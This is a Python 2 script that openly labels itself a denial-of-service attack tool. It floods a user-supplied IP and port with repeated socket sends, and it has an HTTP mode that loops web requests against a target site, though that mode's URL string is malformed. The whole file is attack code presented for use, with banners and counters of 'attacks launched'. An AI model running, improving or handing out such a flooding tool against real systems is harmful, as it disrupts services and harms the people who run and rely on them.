#!/usr/bin/python
import time
#socket library for socket flooding.
import socket
#allow to send HTTP requests if target is a website.
import urllib2
import argparse
import blessings

t = blessings.Terminal()

def interface():
        print t.bold_green + """   ________            _____       ______
    ___  __ \______________(_)_____ ___  /
    __  / / /  _ \_  __ \_  /_  __ `/_  /  
    _  /_/ //  __/  / / /  / / /_/ /_  /  
    /_____/ \___//_/ /_//_/  \__,_/ /_/ """
        print t.bold_red + """
           .:DENIAL OF SERVICE:.
                ATTACK TOOL""" + t.normal
        print
interface()

#parser allows for command line arguments.
parser = argparse.ArgumentParser()
#first argument is t to specifiy the target.
#amount of attacks we want the script to send.  
parser.add_argument("target", help="Target through specifying IP")
parser.add_argument("-amount", help="Amount of requests to be sent e.g 1-10000000")
parser.add_argument("-port", help="Socket to specifiy the targeted port")
parser.add_argument("-http", help="HTTP to specifiy the target site")

args = parser.parse_args()
#check if we have received the two below arguments. 
#if arguments are received then begin attack.
if args.target and args.amount:
    if args.port:
        s = socket.socket()
#connect to target on specified port.
        try:
            s.connect((args.target, int(args.port)))
        except socket.error:
            print "Error: Target is not live or does not exist"
            print
            exit()
        count = 0
        while count < int(args.amount)+1:
            count+=1
            try:
                s.send("DDOS in Progress...\n")
                print "[+][SOCKET FLOODING] - ["+str(count)+" attacks have been initiated and launched]"
                print 
            except socket.error:
                s.close()
                s = socket.socket()
                s.connect((args.target, int(args.port)))
                print "Socket Error"
        s.close()
    if args.http:
        count = 0
        while count < int(args.amount) +1:
            count+=1
            try:
                urllib2.urlopen("https//www,"+args.target)
                print "[HTTP REQUEST]["+str(count)+ "attacks have been initiated and launched]"
            except urllib2.HTTPError:
                print "[Server is Down][Restart in 5 seconds]"
                time.sleep(5)
